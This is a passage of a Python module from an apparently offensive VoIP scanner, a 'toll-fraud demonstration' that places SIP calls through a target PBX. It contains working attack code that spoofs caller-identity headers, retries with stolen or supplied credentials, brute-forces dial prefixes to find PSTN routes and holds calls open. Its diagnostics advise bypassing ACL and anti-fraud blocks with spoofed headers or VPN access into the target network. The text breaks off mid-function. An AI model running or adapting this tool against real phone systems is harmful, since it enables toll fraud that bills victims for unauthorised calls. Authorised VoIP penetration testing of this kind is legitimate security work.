"""Outbound-call proof-of-concept (the toll-fraud demonstration).

Places one INVITE toward the PBX. If the PBX accepts:
  - 401/407  → re-INVITE with digest auth (when creds supplied)
  - 100/180  → ringback (dialplan engaged — already a finding)
  - 200 OK   → ACK, optional SIP-INFO DTMF, BYE (immediate teardown)

No audio is streamed. The whole point is to prove the PBX would carry the
call to a chosen destination — that's the toll-fraud risk demonstration.

Identity-header spoofing (PAI / Diversion / Privacy / RPID / display name)
plus optional SRTP offer are first-class arguments — on Asterisk/FreePBX
deployments these are often the difference between blocked and accepted.
"""
from __future__ import annotations

import socket
import time
from dataclasses import dataclass, field

from . import sip
from .utils import local_ip_for, rand_call_id, rand_tag


@dataclass
class CallResult:
    success: bool                     # reached 200 OK (or 180 in dry_run)
    reached_dialplan: bool             # PBX returned 100/180/183
    status_code: int | None
    reason: str
    evidence: str
    sip_trace: list[str]
    # SRTP outcome: "off" | "offered" | "accepted" | "downgraded" | "required-but-missing"
    srtp_state: str = "off"
    dtmf_digits_sent: list[str] = field(default_factory=list)
    # True iff BYE received 200 OK — confirms full dialog teardown (not just SIP-layer 200)
    call_confirmed: bool = False
    # Actual seconds held before BYE was sent
    hold_seconds_actual: float = 0.0
    # Human-readable root-cause diagnosis (populated by diagnose_call_result)
    failure_reason: str = ""
    # Private Contact/Via vs public target — NAT traversal risk
    nat_suspected: bool = False
    # Local IP used in Contact/Via headers (for external diagnosis)
    local_ip_used: str = ""


def _detect_nat_risk(local_ip: str, host: str) -> bool:
    """True if local_ip is RFC-1918 private while host appears globally routable.

    When True the Contact/Via headers contain an address the PBX cannot route
    back to — causing unacknowledged BYEs and '200 OK but no audio/ring'
    symptoms that look like successful calls but aren't observable externally.
    """
    try:
        import ipaddress as _ipa
        _l = _ipa.ip_address(local_ip)
        _r = _ipa.ip_address(host)
        return bool(_l.is_private and not _r.is_private)
    except Exception:
        return False


# SIP response code → (short_title, detail, remediation_hint)
_SIP_DIAGNOSES: dict[int, tuple[str, str, str]] = {
    100: (
        "TRYING — dialplan reached",
        "PBX accepted the INVITE and is processing the route. "
        "The call is actively being set up.",
        "",
    ),
    180: (
        "RINGING — destination device rang",
        "*** DEFINITIVE TOLL-FRAUD EVIDENCE ***\n"
        "The dialplan routed the call to the destination. "
        "A physical phone or PSTN endpoint was alerted.",
        "",
    ),
    183: (
        "SESSION PROGRESS — early media / PSTN ring tone",
        "PSTN carrier accepted the call and started in-band audio. "
        "This is strong evidence the call reached the public network.",
        "",
    ),
    200: (
        "200 OK — call established at SIP layer",
        "PBX returned 200 OK. If no real call was observed on the destination phone:\n"
        "  (a) NAT: scanner Contact/Via contains a private IP — PBX cannot\n"
        "      reach back for RTP/BYE. The call may still have been placed on PSTN.\n"
        "  (b) IMMEDIATE BYE: call duration may be 0 or too short — the phone\n"
        "      rings for <1 second and is torn down before it can be noticed.\n"
        "  (c) LOCAL APPLICATION: dialplan routes to an Asterisk test/echo/IVR\n"
        "      endpoint rather than a live PSTN trunk.\n"
        "  (d) NO ACTIVE TRUNK: PBX accepted locally but has no carrier to forward to.",
        "Test from same network segment as PBX. Use --call-duration 60 for a longer hold. "
        "Use --ami-check to inspect trunk status.",
    ),
    301: (
        "MOVED PERMANENTLY — number redirected",
        "PBX redirected to a different URI. The dialplan knows this number.",
        "",
    ),
    302: (
        "MOVED TEMPORARILY — number redirected",
        "PBX redirected to a different URI. The dialplan knows this number.",
        "",
    ),
    400: (
        "BAD REQUEST — malformed SIP message",
        "PBX rejected the INVITE due to a message syntax error. "
        "This is typically a compatibility/formatting issue.",
        "",
    ),
    401: (
        "UNAUTHORIZED — digest authentication required",
        "PBX demands credentials for this calling extension. "
        "A route EXISTS in the dialplan — authentication is the only barrier. "
        "The toll-fraud risk remains if valid credentials are obtained.",
        "Provide --username and --password for a registered extension.",
    ),
    403: (
        "FORBIDDEN — ACL / anti-fraud policy actively blocking",
        "PBX actively rejected the call. Possible causes:\n"
        "  • IP-based ACL blocking your source address (permit=/deny= in sip.conf)\n"
        "  • Anti-toll-fraud dialplan rules (pattern match explicitly rejected)\n"
        "  • Outbound route restriction (DID or trunk limitation)\n"
        "  • SIP peer/trunk registration required but not present\n"
        "The PBX is aware of the attempt and is actively blocking it.",
        "Try from an allowed subnet. Check for SIP peer ACL using --ami-check. "
        "Test with spoofed identity headers.",
    ),
    404: (
        "NOT FOUND — number not in dialplan",
        "PBX has no route for this dialled number/prefix combination.\n"
        "Common causes:\n"
        "  • Wrong prefix (try 9, 0, 00, +, 011, 001, 9+, 9011)\n"
        "  • Number pattern too long or short for dialplan _X. rules\n"
        "  • Outbound routes require a specific trunk group prefix or class of service",
        "Run --discover-prefix to automatically probe all prefix variants.",
    ),
    407: (
        "PROXY AUTH REQUIRED — SIP proxy demands credentials",
        "A SIP proxy (not the PBX endpoint) requires authentication. "
        "The route exists but a proxy is acting as an auth gateway.",
        "Provide --username and --password.",
    ),
    408: (
        "REQUEST TIMEOUT — trunk/destination unreachable within timer",
        "PBX could not reach the destination before the SIP timer expired.\n"
        "Possible causes:\n"
        "  • PSTN trunk is down or unresponsive\n"
        "  • NAT/firewall blocking the outbound path from PBX to carrier\n"
        "  • Destination number is unreachable or no longer in service\n"
        "  • B2BUA timer too short for international call setup",
        "Check PSTN trunk status with --ami-check. Test with a known-working number.",
    ),
    410: (
        "GONE — number permanently removed",
        "The dialled number previously existed but has been decommissioned.",
        "",
    ),
    480: (
        "TEMPORARILY UNAVAILABLE — destination offline",
        "The destination extension or endpoint is registered but currently "
        "unavailable (device powered off, in DND, or unreachable).",
        "",
    ),
    481: (
        "CALL DOES NOT EXIST — dialog state mismatch",
        "PBX does not recognise the Call-ID/dialog. Possible causes:\n"
        "  • SIP ALG on a NAT device mangling Call-ID or headers\n"
        "  • Stateful firewall dropping INVITE but not subsequent packets\n"
        "  • PBX state was cleared (restart) between messages",
        "Disable SIP ALG on intermediate routers. Check for stateful firewall rules.",
    ),
    483: (
        "TOO MANY HOPS — Max-Forwards exceeded",
        "The SIP Max-Forwards counter reached zero. "
        "The message passed through too many SIP proxies/B2BUAs.",
        "",
    ),
    484: (
        "ADDRESS INCOMPLETE — dialled number too short for dialplan",
        "PBX received fewer digits than its dialplan patterns expect.\n"
        "The prefix is likely correct but the full number is needed.",
        "Ensure --call-to is a complete E.164 number (e.g. +447700900000).",
    ),
    486: (
        "BUSY HERE — *** REACHED DESTINATION: PHONE WAS BUSY ***",
        "*** HIGH-CONFIDENCE TOLL-FRAUD EVIDENCE ***\n"
        "The destination telephone rang and the line was busy.\n"
        "The call was routed through the PSTN to the physical destination.\n"
        "486 is definitive proof the carrier accepted the call and "
        "the destination was alerted — it was simply engaged at the time.",
        "",
    ),
    487: (
        "REQUEST TERMINATED — call was cancelled (dry-run mode)",
        "The INVITE was cancelled (CANCEL sent). In dry-run mode this is expected "
        "— the dialplan was engaged and the scanner cancelled to avoid completing "
        "the call. This is a POSITIVE FINDING: the dialplan accepted the route.",
        "",
    ),
    488: (
        "NOT ACCEPTABLE HERE — codec / media negotiation failed",
        "PBX rejected the SDP offer. Media codec or transport did not match.\n"
        "Possible causes:\n"
        "  • PBX requires SRTP but scanner offered plain RTP/AVP\n"
        "  • Codec mismatch (PBX needs G.729/G.722, offer was G.711 PCMU)\n"
        "  • SDP format incompatibility",
        "Try --srtp offer or verify codec capabilities.",
    ),
    500: (
        "SERVER INTERNAL ERROR — PBX fault",
        "The PBX encountered an internal error processing the INVITE. "
        "May indicate a misconfigured dialplan, Asterisk crash, or resource exhaustion.",
        "",
    ),
    503: (
        "SERVICE UNAVAILABLE — no active PSTN trunk",
        "PBX accepted the dialplan route but no SIP trunk/gateway is available.\n"
        "This CONFIRMS the dialplan WOULD route the call if a trunk were up.\n"
        "Possible causes:\n"
        "  • No SIP trunk registered or active\n"
        "  • All trunk channels exhausted\n"
        "  • PSTN gateway unreachable\n"
        "  • Trunk group authentication failed with carrier",
        "Check SIP trunk status with --ami-check. Verify PSTN gateway connectivity.",
    ),
    504: (
        "SERVER TIMEOUT — upstream trunk timed out",
        "PBX routed the call but the upstream PSTN gateway or carrier "
        "did not respond in time. Route was attempted — trunk is configured.",
        "",
    ),
    603: (
        "DECLINE — call explicitly rejected by destination",
        "The called party explicitly declined the call. "
        "This CONFIRMS the call reached the destination — strong toll-fraud evidence.",
        "",
    ),
}


def diagnose_call_result(
    result: "CallResult",
    *,
    host: str = "",
    local_ip: str = "",
) -> str:
    """Return a human-readable multi-line diagnostic for a toll-fraud call attempt.

    Explains WHY the call succeeded/failed, what it means for risk, and
    what steps could verify or further exploit the weakness.
    """
    lines: list[str] = []
    code = result.status_code
    reason = result.reason or ""
    lip = local_ip or result.local_ip_used or "scanner-IP"

    # ── SIP outcome ────────────────────────────────────────────────────────
    if code is None:
        lines.append("OUTCOME: TIMEOUT — no final SIP response received")
        lines.append("")
        lines.append("CAUSE ANALYSIS (most-likely first):")
        lines.append("")
        lines.append("  1. FIREWALL / INBOUND UDP BLOCKED:")
        lines.append(f"     PBX at {host or 'target'} may have received your INVITE")
        lines.append(f"     but UDP responses are blocked back to {lip}.")
        lines.append("     Use Wireshark/tcpdump on target to confirm INVITE arrival.")
        lines.append("")
        if result.nat_suspected or (local_ip and host):
            lines.append("  2. NAT TRAVERSAL FAILURE (LIKELY):")
            lines.append(f"     Your Contact/Via header advertises {lip} (private RFC-1918).")
            lines.append(f"     The PBX ({host}) cannot route SIP responses to a private address.")
            lines.append("     All responses are sent to an unreachable destination.")
            lines.append("")
        lines.append("  3. SIP ALG INTERFERENCE:")
        lines.append("     An intermediate router's SIP Application Layer Gateway (ALG)")
        lines.append("     may be mangling or silently dropping SIP packets.")
        lines.append("     → Disable SIP ALG on all routers between scanner and PBX.")
        lines.append("")
        lines.append("  4. RATE LIMITING / FAIL2BAN:")
        lines.append("     PBX may be silently dropping packets from your source IP")
        lines.append("     due to fail2ban, iptables, or built-in SIP flood protection.")
        lines.append("")
        lines.append("  FIXES:")
        lines.append("  → Test from the same L2 network segment as the PBX.")
        lines.append("  → Use SSH/VPN tunnel into target network before scanning.")
        lines.append("  → Use --stun-auto to discover your public IP for Contact headers.")
        lines.append("  → Disable SIP ALG on all intermediate routers.")
    else:
        diag = _SIP_DIAGNOSES.get(code)
        if diag:
            title, detail, remediation = diag
            lines.append(f"OUTCOME: {code} {reason}")
            lines.append(f"         {title}")
            lines.append("")
            lines.append("CAUSE ANALYSIS:")
            for dline in detail.split("\n"):
                lines.append(f"  {dline}")
            if remediation:
                lines.append("")
                lines.append("RECOMMENDED ACTIONS:")
                for rline in remediation.split("\n"):
                    lines.append(f"  → {rline}")
        else:
            lines.append(f"OUTCOME: {code} {reason}")
            lines.append(f"         (see RFC 3261 §21 for {code // 100}xx class semantics)")

    # ── NAT warning for 200 OK without BYE ack ────────────────────────────
    if code == 200 and not result.call_confirmed:
        lines.append("")
        lines.append("WARNING — BYE NOT ACKNOWLEDGED:")
        lines.append("  200 OK was received but no 200 response to our BYE was seen.")
        lines.append(f"  Contact/Via header advertised: {lip}")
        if result.nat_suspected:
            lines.append(f"  Target PBX: {host} (public/non-private IP)")
            lines.append("  → Your private Contact IP is unreachable from the PBX.")
            lines.append("    The call MAY have been placed on the PSTN but audio and")
            lines.append("    BYE routing cannot flow back to you through NAT.")
            lines.append("    This is the most common cause of '200 OK but no call seen'.")
        else:
            lines.append("  → Even without confirmed NAT, check for SIP ALG or firewall.")
            lines.append("    The BYE may have been dropped by a stateful NAT device.")

    # ── Hold time note for 200 OK / confirmed calls ────────────────────────
    if code == 200:
        lines.append("")
        if result.hold_seconds_actual > 0:
            lines.append(f"HOLD TIME: {result.hold_seconds_actual:.1f}s before BYE was sent.")
            lines.append("  If the phone did not ring, the call was likely routed to a local")
            lines.append("  application (echo test, IVR) rather than a PSTN trunk.")
        else:
            lines.append("HOLD TIME: 0s — BYE sent immediately after 200 OK.")
            lines.append("  With an immediate BYE the phone may ring for <0.5s only.")
            lines.append("  Use --call-duration 60 to hold the call for 60 seconds so")
            lines.append("  the destination phone rings visibly for an extended period.")

    # ── Confirmation status ────────────────────────────────────────────────
    if code is not None and 200 <= code < 300:
        lines.append("")
        if result.call_confirmed:
            lines.append(
                f"DIALOG CONFIRMED: BYE acknowledged — full RFC 3261 dialog lifecycle "
                f"complete. Hold: {result.hold_seconds_actual:.1f}s."
            )
        else:
            lines.append("DIALOG UNCONFIRMED: BYE was sent but no 200 response received.")
            lines.append("  This does NOT mean the call failed — it means the BYE")
            lines.append("  acknowledgement could not be tracked (NAT or PBX behaviour).")

    # ── Risk summary ───────────────────────────────────────────────────────
    lines.append("")
    lines.append("TOLL-FRAUD RISK ASSESSMENT:")
    if result.success and result.call_confirmed:
        lines.append("  ▶ CRITICAL — 200 OK + BYE acknowledged (full dialog complete)")
        lines.append("  ▶ PSTN CALL: CONFIRMED PLACED AND COMPLETED")
    elif result.success:
        lines.append("  ▶ CRITICAL — 200 OK received (call established at SIP layer)")
        lines.append("  ▶ PSTN CALL: PROBABLE — PBX accepted routing (verify locally)")
    elif code == 486:
        lines.append("  ▶ CRITICAL — 486 Busy = destination phone rang on PSTN")
        lines.append("  ▶ PSTN CALL: CONFIRMED PLACED (carrier accepted)")
    elif code in (180, 183):
        lines.append("  ▶ HIGH — Provisional = dialplan routed toward PSTN")
        lines.append("  ▶ PSTN CALL: PROBABLE")
    elif code == 487:
        lines.append("  ▶ HIGH — Dialplan accepted route (dry-run CANCEL)")
        lines.append("  ▶ PSTN CALL: WOULD BE PLACED with non-dry-run INVITE")
    elif code in (401, 407):
        lines.append("  ▶ MEDIUM — Route exists, authentication required")
        lines.append("  ▶ PSTN CALL: POSSIBLE with valid credentials")
    elif code == 403:
        lines.append("  ▶ MEDIUM — Actively blocked by ACL/anti-fraud policy")
        lines.append("  ▶ PSTN CALL: BLOCKED currently — may be bypassed from allowed IP")
    elif code == 503:
        lines.append("  ▶ MEDIUM — Dialplan route confirmed, PSTN trunk missing")
        lines.append("  ▶ PSTN CALL: BLOCKED (no trunk) — dialplan is vulnerable")
    elif result.reached_dialplan:
        lines.append(f"  ▶ HIGH — Dialplan reached ({code} {reason})")
        lines.append("  ▶ PSTN CALL: ATTEMPTED but rejected at carrier/routing level")
    elif code is None:
        lines.append("  ▶ UNKNOWN — No SIP response (firewall/NAT most likely)")
        lines.append("  ▶ PSTN CALL: UNKNOWN — cannot determine without response")
    else:
        lines.append(f"  ▶ LOW — Rejected at SIP layer ({code})")
        lines.append("  ▶ PSTN CALL: REJECTED")

    return "\n".join(lines)


def _build_sdp(local_ip: str, rtp_port: int = 49170,
               srtp_offer: str | None = None) -> str:
    import time as _t
    sess_id = int(_t.time())
    proto = "RTP/SAVP" if srtp_offer else "RTP/AVP"
    lines = [
        "v=0",
        f"o=scanner {sess_id} {sess_id} IN IP4 {local_ip}",
        "s=voip-scan-poc",
        f"c=IN IP4 {local_ip}",
        "t=0 0",
        f"m=audio {rtp_port} {proto} 0",
        "a=rtpmap:0 PCMU/8000",
        "a=sendrecv",
    ]
    if srtp_offer:
        lines.append(srtp_offer)
    return "\r\n".join(lines) + "\r\n"


def place_call(
    host: str,
    call_to: str,
    call_from: str,
    *,
    port: int = 5060,
    username: str | None = None,
    password: str | None = None,
    timeout: float = 5.0,
    dry_run: bool = False,
    max_wait: float = 10.0,
    call_duration: float = 60.0,  # seconds to hold before BYE (default 60 = 1 min)
    traffic_log=None,
    # Identity / spoof primitives
    pai: str | None = None,
    diversion: str | None = None,
    privacy: str | None = None,
    remote_party_id: str | None = None,
    from_display: str | None = None,
    # Network binding
    source_ip: str = "",
    source_port_range: tuple[int, int] | None = None,
    # Media
    srtp: str = "off",       # "off" | "offer" | "require"
    dtmf_digits: str = "",   # e.g. "1p500#" — 'pN' = N-ms pause
) -> CallResult:
    """Place one INVITE; handle 401 re-auth; on 200 OK send ACK then BYE.

    Identity headers, source binding, SRTP, and DTMF are all optional. Default
    behaviour is a plain anonymous-INVITE PoC suitable for FreePBX / Asterisk /
    Grandstream toll-fraud demonstrations.
    """
    local_ip = source_ip or local_ip_for(host)
    nat_suspected = _detect_nat_risk(local_ip, host)
    # Determine bind IP: never bind to a public/NAT address (use INADDR_ANY)
    try:
        import ipaddress as _ip
        bind_ip = "" if _ip.ip_address(local_ip).is_global else local_ip
    except (ValueError, Exception):
        bind_ip = local_ip
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    bye_confirmed = False
    hold_seconds_actual = 0.0

    bound = False
    if source_port_range:
        lo, hi = source_port_range
        for p in range(lo, hi + 1):
            try:
                s.bind((bind_ip, p))
                bound = True
                break
            except OSError:
                continue
    if not bound:
        try:
            s.bind((bind_ip, 0))
        except OSError:
            s.bind(("", 0))
    local_port = s.getsockname()[1]

    call_id = rand_call_id()
    tag_from = rand_tag()
    uri = f"sip:{call_to}@{host}"
    trace: list[str] = []

    # ---- SRTP offer (optional) ----
    srtp_offer_line: str | None = None
    srtp_state = "off"
    if srtp.lower() in ("offer", "require"):
        try:
            from . import srtp as _srtp
            mk, ms = _srtp.generate_sdes_key()
            srtp_offer_line = _srtp.sdes_crypto_attribute(1, mk, ms)
            srtp_state = "offered"
            trace.append(f"* SRTP={srtp} — offering AES_CM_128_HMAC_SHA1_80")
        except ImportError as exc:
            if srtp.lower() == "require":
                s.close()
                return CallResult(
                    success=False, reached_dialplan=False, status_code=None,
                    reason="srtp require without crypto backend",
                    evidence=f"--srtp require needs 'cryptography': {exc}",
                    sip_trace=trace,
                )
            trace.append(f"! SRTP offer skipped (no crypto: {exc})")

    identity_kwargs = dict(
        pai=pai, diversion=diversion, privacy=privacy,
        remote_party_id=remote_party_id, from_display=from_display,
    )

    def send(msg: bytes) -> None:
        if traffic_log:
            traffic_log.log("OUT", f"{host}:{port}", msg)
        s.sendto(msg, (host, port))

    def recv_one() -> bytes | None:
        try:
            data, _ = s.recvfrom(65535)
            if traffic_log:
                traffic_log.log("IN", f"{host}:{port}", data)
            return data
        except socket.timeout:
            return None

    # ---- 1) Initial INVITE ----
    invite = sip.build_message(
        "INVITE", uri,
        from_user=call_from, to_user=call_to,
        host=host, port=port,
        local_ip=local_ip, local_port=local_port,
        call_id=call_id, cseq=1, from_tag=tag_from,
        body=_build_sdp(local_ip, srtp_offer=srtp_offer_line),
        **identity_kwargs,
    )
    send(invite)
    trace.append(f"> INVITE sip:{call_to}@{host}")

    deadline = time.monotonic() + max_wait
    final: sip.SipResponse | None = None
    reached_dialplan = False
    last_to_tag: str | None = None
    auth_attempted = False

    try:
        while time.monotonic() < deadline:
            data = recv_one()
            if not data:
                continue
            resp = sip.parse_response(data)
            if not resp:
                continue
            trace.append(f"< {resp.status_code} {resp.reason}")

            # Extract To tag for ACK/BYE routing
            to_hdr = resp.headers.get("to", "")
            if ";tag=" in to_hdr:
                last_to_tag = to_hdr.split(";tag=", 1)[1].split(";")[0] \
                                     .split(",")[0].strip()

            if resp.status_code in (100, 180, 183):
                reached_dialplan = True
                if dry_run and resp.status_code in (180, 183):
                    final = resp
                    break
                continue

            if resp.is_auth_required and not auth_attempted:
                if not (username and password):
                    final = resp
                    break
                auth_attempted = True

                # ACK the 401 (CSeq must match the rejected INVITE)
                try:
                    ack_cseq = int(resp.headers.get("cseq", "1").split()[0])
                except (ValueError, IndexError):
                    ack_cseq = 1
                hdr_name = ("Proxy-Authorization" if resp.status_code == 407
                            else "Authorization")
                auth_header = sip.build_auth_header(
                    username, password, "INVITE", uri,
                    resp.auth_params, header_name=hdr_name,
                )

                ack = sip.build_message(
                    "ACK", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=ack_cseq, from_tag=tag_from,
                    to_tag=last_to_tag,
                )
                send(ack)
                trace.append("> ACK (to 401)")

                # Fresh transaction for auth retry (RFC 3261 §17.1.1.3)
                call_id = rand_call_id()
                invite2 = sip.build_message(
                    "INVITE", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=1, from_tag=tag_from,
                    auth_header=auth_header,
                    body=_build_sdp(local_ip, srtp_offer=srtp_offer_line),
                    **identity_kwargs,
                )
                send(invite2)
                trace.append("> INVITE (auth)")
                continue
            elif resp.is_auth_required and auth_attempted:
                trace.append(f"< {resp.status_code} second auth challenge — giving up (loop guard)")
                final = resp
                break

            if 200 <= resp.status_code < 300:
                final = resp

                # ---- SRTP answer check ----
                if srtp_offer_line:
                    try:
                        from . import rtp as _rtp
                        answer_media = _rtp.parse_sdp_answer(resp.body or "")
                    except Exception:
                        answer_media = None
                    if answer_media and answer_media.srtp_crypto:
                        srtp_state = "accepted"
                        trace.append("* SRTP accepted — a=crypto honoured")
                    else:
                        srtp_state = ("required-but-missing"
                                      if srtp.lower() == "require"
                                      else "downgraded")
                        trace.append(
                            f"! SRTP {srtp_state} — answer lacked a=crypto"
                        )

                # ---- ACK + optional SIP-INFO DTMF + BYE ----
                try:
                    ack_cseq = int(resp.headers.get("cseq", "1").split()[0])
                except (ValueError, IndexError):
                    ack_cseq = 1
                ack = sip.build_message(
                    "ACK", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=ack_cseq,
                    from_tag=tag_from, to_tag=last_to_tag,
                )
                send(ack)
                trace.append("> ACK")

                # ---- Hold phase (listen for PBX-initiated BYE while holding) ----
                _hold_s = max(0.0, min(call_duration, 3600.0))
                if _hold_s > 0:
                    trace.append(f"* Call established — holding {_hold_s:.0f}s then BYE")
                    _hold_start = time.monotonic()
                    _hold_deadline = _hold_start + _hold_s
                    s.settimeout(1.0)
                    while time.monotonic() < _hold_deadline:
                        try:
                            _pkt, _ = s.recvfrom(65535)
                            _pr = sip.parse_response(_pkt)
                            if _pr:
                                trace.append(f"< (hold) {_pr.status_code} {_pr.reason}")
                                # PBX tore down call during hold — record and exit
                                if _pr.status_code and _pr.status_code >= 400:
                                    break
                        except socket.timeout:
                            pass
                        except OSError:
                            break
                    hold_seconds_actual = min(time.monotonic() - _hold_start, _hold_s)
                    s.settimeout(timeout)
                else:
                    trace.append("* Call established — immediate BYE (0s hold)")

                # ---- Optional SIP-INFO DTMF ----
                dtmf_sent: list[str] = []
                bye_cseq = ack_cseq + 1
                if dtmf_digits:
                    try:
                        from . import dtmf as _dtmf
                        import re as _re
                        tokens = _re.findall(r"p\d+|[0-9*#A-D]", dtmf_digits)
                        info_cseq = ack_cseq + 1
                        for tok in tokens:
                            if tok.startswith("p"):
                                try:
                                    time.sleep(min(int(tok[1:]), 60000) / 1000.0)
                                except ValueError:
                                    pass
                                continue
                            _dtmf.send_sip_info_dtmf(
                                s, (host, port),
                                request_uri=uri,
                                from_uri=f"sip:{call_from}@{host}",
                                to_uri=f"sip:{call_to}@{host}",
                                call_id=call_id, cseq=info_cseq,
                                from_tag=tag_from, to_tag=last_to_tag or "",
                                local_ip=local_ip, local_port=local_port,
                                digit=tok, duration_ms=160,
                            )
                            dtmf_sent.append(tok)
                            trace.append(f"> INFO DTMF={tok}")
                            info_cseq += 1
                            time.sleep(0.1)
                        bye_cseq = info_cseq
                    except Exception as exc:
                        trace.append(f"! SIP-INFO DTMF failed: {exc}")

                # ---- BYE + await acknowledgment (RFC 3261 §15.1) ----
                bye = sip.build_message(
                    "BYE", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=bye_cseq, from_tag=tag_from,
                    to_tag=last_to_tag,
                )
                send(bye)
                trace.append("> BYE")

                # Wait up to 5 s for the PBX to acknowledge our BYE (200 OK).
                # A missing ack usually means NAT — the PBX cannot route back to
                # our private Contact IP.  We still count the call as a finding
                # but flag call_confirmed=False so the diagnostic report explains why.
                _bye_deadline = time.monotonic() + min(timeout, 5.0)
                s.settimeout(min(timeout, 2.0))
                while time.monotonic() < _bye_deadline:
                    _bd = recv_one()
                    if _bd:
                        _br = sip.parse_response(_bd)
                        if _br:
                            trace.append(f"< {_br.status_code} {_br.reason} (BYE ack)")
                            if 200 <= _br.status_code < 300:
                                bye_confirmed = True
                                break
                if not bye_confirmed:
                    trace.append("! BYE not acknowledged (NAT or firewall suspected)")
                s.settimeout(timeout)

                # Smuggle DTMF list onto response for the result builder
                final._dtmf_sent = dtmf_sent  # type: ignore[attr-defined]
                break

            if 300 <= resp.status_code < 400:
                redirect = resp.headers.get("contact", "")
                trace.append(f"< {resp.status_code} redirect → {redirect}")
                # Treat as dialplan engaged (routing is happening)
                reached_dialplan = True
                final = resp
                break

            if resp.status_code >= 400:
                final = resp
                break
    finally:
        # Send CANCEL if we broke out on a provisional (dry_run) — prevents ghost call legs
        if dry_run and reached_dialplan and (final is None or (final.status_code and final.status_code < 200)):
            try:
                cancel_cseq = 1
                cancel = sip.build_message(
                    "CANCEL", uri,
                    from_user=call_from, to_user=call_to,
                    host=host, port=port,
                    local_ip=local_ip, local_port=local_port,
                    call_id=call_id, cseq=cancel_cseq, from_tag=tag_from,
                    to_tag=last_to_tag,
                )
                send(cancel)
                trace.append("> CANCEL (dry-run teardown)")
            except Exception:
                pass
        s.close()

    if not final:
        return CallResult(
            success=False, reached_dialplan=reached_dialplan,
            status_code=None, reason="timeout",
            evidence="no final response before max_wait (firewall/NAT suspected)",
            sip_trace=trace, srtp_state=srtp_state,
            nat_suspected=nat_suspected,
            local_ip_used=local_ip,
        )

    success = (200 <= final.status_code < 300) or (dry_run and reached_dialplan)
    if srtp.lower() == "require" and srtp_state == "required-but-missing":
        success = False

    evidence = f"{final.status_code} {final.reason}"
    if success and dry_run:
        evidence += " (dry-run: dialplan engaged at provisional)"
    elif success:
        if hold_seconds_actual > 0:
            evidence += f" (200 OK — held {hold_seconds_actual:.0f}s"
            evidence += " — BYE acked)" if bye_confirmed else " — BYE unacked/NAT)"
        else:
            evidence += " (200 OK — immediate BYE"
            evidence += " — acked)" if bye_confirmed else " — unacked/NAT)"
    if srtp_state != "off":
        evidence += f" [srtp={srtp_state}]"
    if nat_suspected:
        evidence += " [NAT-suspected]"

    return CallResult(
        success=success,
        reached_dialplan=reached_dialplan,
        status_code=final.status_code,
        reason=final.reason,
        evidence=evidence,
        sip_trace=trace,
        srtp_state=srtp_state,
        dtmf_digits_sent=getattr(final, "_dtmf_sent", []),
        call_confirmed=bye_confirmed,
        hold_seconds_actual=hold_seconds_actual,
        nat_suspected=nat_suspected,
        local_ip_used=local_ip,
    )


# ---------------------------------------------------------------------------
# Dial-plan prefix discovery
# ---------------------------------------------------------------------------

# Comprehensive PSTN access prefix list, ordered most-common-first.
# Empty string = bare E.164 (direct routing — try first, cheapest path).
DIALPLAN_PREFIXES: list[str] = [
    "",      # bare E.164 — direct SIP-to-PSTN
    "9",     # North American outbound (FreePBX/Asterisk default)
    "0",     # Europe/PSTN single-zero
    "00",    # European IDD
    "+",     # E.164 plus notation (separate from 00)
    "1",     # legacy/direct North American
    "011",   # North American IDD
    "001",   # alternate North American IDD
    "8",     # post-Soviet/CIS (Russia, Ukraine, Kazakhstan)
    "0011",  # Australian IDD
    "9+",    # North American + E.164 combined (some FreePBX/Asterisk configs)
    "9011",  # North American IDD via '9' outbound prefix
    "9001",  # alternate North American IDD via '9' outbound prefix
    "90",    # European/hotel PBX outbound via '9' prefix
    "810",   # post-Soviet trunk + IDD (Russia CIS: 8=trunk, 10=IDD)
    "0+",    # European E.164 hybrid (some 3CX / Yealink provisioning)
    "81",    # CIS abbreviated IDD (8 = trunk, 1 = IDD start)
    "0012",  # legacy North American IDD variant
    "9+1",   # North American E.164 via 9 outbound (some hosted PBX)
]

# Platform-tuned prefix order: lead with the most likely prefix for each platform.
_FINGERPRINT_PREFIX_HINTS: dict[str, list[str]] = {
    "FreePBX":     ["9", "", "0", "00", "+", "1", "011", "001", "9+", "9011", "9001", "8", "0011"],
    "Asterisk":    ["9", "", "0", "00", "+", "1", "011", "001", "9+", "9011", "9001", "8", "0011"],
    "3CX":         ["0", "9", "", "00", "+", "1", "0+", "011", "001", "90"],
    "Grandstream": ["9", "0", "", "00", "+", "1", "011", "90", "001"],
    "Mitel":       ["9", "8", "0", "", "00", "+", "1", "011", "810", "81"],
    "Sangoma":     ["9", "", "0", "00", "+", "1", "011", "001", "9+", "9011"],
}


def prefixes_for_fingerprint(fingerprint: str) -> list[str]:
    """Return the prefix list optimally ordered for the detected platform."""
    return _FINGERPRINT_PREFIX_HINTS.get(fingerprint, DIALPLAN_PREFIXES)


def discover_all_prefixes(
    host: str,
    call_to: str,
    call_from: str,
    *,
    port: int = 5060,
    username: str | None = None,
    password: str | None = None,
    timeout: float = 5.0,
    traffic_log=None,
    source_ip: str = "",
    source_port_range: tuple[int, int] | None = None,
    prefixes: list[str] | None = None,
) -> list[tuple[str, str]]:
    """Exhaustively probe every prefix and return ALL that reach the dialplan.

    Returns list of (prefix, full_destination) for every prefix that produced
    a 100/180/183 response. Empty list if none worked. Use this in --auto mode
    to fully map the PBX's outbound routing rules rather than stopping at first hit.
    """
    if prefixes is None:
        prefixes = DIALPLAN_PREFIXES
    hits: list[tuple[str, str]] = []
    for prefix in prefixes:
        dest = f"{prefix}{call_to}" if prefix else call_to
        result = place_call(
            host, dest, call_from,
            port=port, username=username, password=password,
            timeout=timeout, dry_run=True, max_wait=timeout + 2.0,
            traffic_log=traffic_log,
            source_ip=source_ip, source_port_range=source_port_range,
        )
        if result.reached_dialplan:
            hits.append((prefix, dest))
    return hits


def discover_dialplan_prefix(
    host: str,
    call_to: str,
    call_from: str,
    *,
    port: int = 5060,
    username: str | None = None,
    password: str | None = None,
    timeout: float = 5.0,
    traffic_log=None,
